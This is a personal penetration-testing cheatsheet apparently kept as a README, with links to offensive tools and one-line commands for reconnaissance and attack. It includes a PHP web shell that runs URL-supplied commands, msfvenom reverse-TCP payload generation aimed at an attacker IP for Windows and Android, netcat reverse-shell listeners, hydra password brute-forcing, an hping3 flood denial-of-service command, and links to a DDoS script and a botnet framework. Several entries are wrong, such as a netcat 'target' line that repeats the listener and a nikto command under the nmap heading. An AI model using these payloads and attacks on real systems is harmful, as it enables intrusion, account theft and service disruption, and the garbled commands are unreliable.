# CH4RR10t

Resources and cheatsheet collection


---------------------------------
# BROWSER EXTENSIONS
---------------------------------

- FoxyProxy
- Wappalyzer



---------------------------------
# LINKS
---------------------------------

- [Pentesting Bible](https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE)
- [Offensive security cheatsheet](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
- [infosecn1nja](https://github.com/infosecn1nja)
- [Red-Teaming-Toolkit](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development)
- [Google CTF](https://capturetheflag.withgoogle.com/)
- [Reverse shell cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Reverse shell generator](https://www.revshells.com/)
- [Vulhub vulnerable mackines](https://www.vulnhub.com/)
- [Saphyra DDOS](https://github.com/IkzCx/ProgramsForDDos/blob/master/Saphyra.py)
- [Botnets](https://byob.dev/)
- [Hackxpert web pentesting labs](https://www.hackxpert.com/labs)
- [Hacking articles](https://www.hackingarticles.in/)
- [Anonymous FTP login](https://shahmeeramir.com/penetration-testing-of-an-ftp-server-19afe538be4b)
- [4500+ Vulnerable Google sites](https://sguru.org/ghdb-download-list-4500-google-dorks-free/)


---------------------------------
# CHEATSHEET
---------------------------------

### πFind IP addresses of target

`$ host <SITE>
$ ping <SITE/IP>
$ nslookup <SITE>`

β¦ for additional info(numbers, admin info, physical address, domain info, name servers, registrar info):

`$ whois <SITE>`

### π IDENTIFY THE TYPE OF HASH

`$ hash-identifier`

### π FTP Login (with credentials)

`$ ftp <IP>`

### π GET LINUX PC INFO

`$ uname -a`

### π START REVERSE SHELL (netcat)

attacker:

`$ nc -lnvp <PORT> -s <IP>`

target:

`$ nc -lnvp <PORT> -s <IP>`

### π EXECUTE COMMANDS IN URL WITH PHP SHELL_EXEC

1. create file [anyname.php]

`$ <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

1. upload to server
2. execute commands by going to:

http://<IP>/anyname.php?cmd=<COMMAND>

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4b3de9b-cd1e-42f0-b18b-6137415b15ee/Untitled.png)

### π PORT::3389 OPEN (REMOTE SCREEN CONTROL)

framework: Crowbar

### π TCP REVERSE SHELL EXPLOIT (Metasploit)

standard format:

`$ msfvenom -p <PAYLOAD_PATH> -f <FILE_EXTENSION> -o <FILE_NAME + EXTENSION> LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`

windows target:
`$ msfvenom -p windows/meterpreter/reverse_tcp -f <FILE_EXTENSION> -o <FILE_NAME + EXTENSION> LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`

android target:
`$ msfvenom -p android/meterpreter/reverse_tcp -o app.exe LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`

### π GUESS/CRACK/BRUTEFORCE PSWD

framework: hydra

usage:

`$ hydra --l <NAME> -P <passlist.txt/WORDLIST_PATH> <IP>`

### π SAMBA ENUMERATION

Get information from a Samba system (find usernames)

`$ enum4linux -a <IP>`

### π GET DIECTORIES ON TARGET/WEBSITE

framework: dirb

`$ dirb <URL+http://>`

β¦ with custom wordlist:

`$ dirb <URL+http://> <WORDLIST_PATH>`

framework: ffuf

`$ ffuf -c -w <WORDLIST_PATH> -u <http://+URL+/FUZZ>`

framework: gobuster

`$ gobuster dir -e -u <URL> -w <WORDLIST_PATH>`

### π BRUTE-FORCE PASSWORD

FTP:

`$ hydra -l <USERNAME> -P <WORDLIST_PATH[rockyou]> ftp://<ip>`

### π FTP login

`$ ftp <IP>`

### π FIND HIDDEN FILES IN FILES

`$ binwalk <FILE_PATH>`

### π EXTRACT DATA HIDDEN IN FILES

`$ steghide βextract -sf <FILE_PATH>`

### π DOWNLOAD FILE FROM REMOTE [SSH/FTP]

`$ sudo scp <USERNAME>@<REMOTE_IP>:<FILE_PATH+ext> <LOCAL_PATH>`

eg `ββ$ sudo scp [james@10.10.8.132](mailto:james@10.10.8.132):Alien_autospy.jpg ~/Desktop`

### π EXTRACT HIDDEN FILES IN FILES

`$ binwalk <FILE_PATH> -e`

### π UNLOCK ZIPPED FILES

`$ zip2john <ZIP_FILE_PATH> > output.txt`

### π SCAN SPECIFIC FILE EXTENSION

framework: dirb

`$ dirb <IP/URL> -X <.FIlE_EXTENSION>`

### π Getting target/site technologies & versions

framwork: whatweb

`$ whatweb -v <IP/SITE>`

### π BASE64 DECODE

`$ base64 -d <<< <STRING>`

### π RDP (Remote Desktop Protocol) [windows screen acsess]

[if you have password and username(try Administrator/admin)]

`$ freerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.106.116 /u:<USERNAME> /p:'<PSWD>'`

# SCAN FOR OUTDATED SERVICES, SERVER CONFIG, VERSION INFO, VULNERABILITIES

framework: Nikto

usage:

`$ nikto -h <URL/IP>`

scan specific port:

`$ nikto -h <URL/IP> -p <PORT>`

### π START A WEB SERVER

`$ sudo python3 -m http.server 80`

### π NMAP

basic usage:

`$ nikto -h <SITE/IP> -p <PORT>`

vulnerability scan:

`$ nmap --script vuln <IP>`

### π GET FILE TYPE

`$ file <FILE_PATH>`

### π FIND A FILE

`$ find / -type f -name <FILENAME+EXT>`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/869d9b68-cce4-4dc9-b146-07200eb6fe0e/Untitled.png)

### π FOR A STABLE SHELL

`$ python -c βimport pty;pty.spawn(β/bin/bashβ)β`

`Ctrl+Z`

`$ stty raw -echo`

`$ fg`

`$ export TERM=xterm`

### π DOS

`$ sudo hping3 -1 --flood <IP>` [-1 [icmp ping] defuault uses tcp. -S [syn attack] -d <NUMBER_OF_BYTES>]

Low Point Ion Cannon

### π VIEW AND EDIT FILE HEX CONTENT

`$ hexeditor <FILE_PATH>`

### π WINDOWS CREATE USER

`$ net user <USERNAME> <PSWD> /add`

### π PORT INFORMATION

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b8c3363b-e3f3-451a-8f69-3387b23cdcbb/Untitled.png)
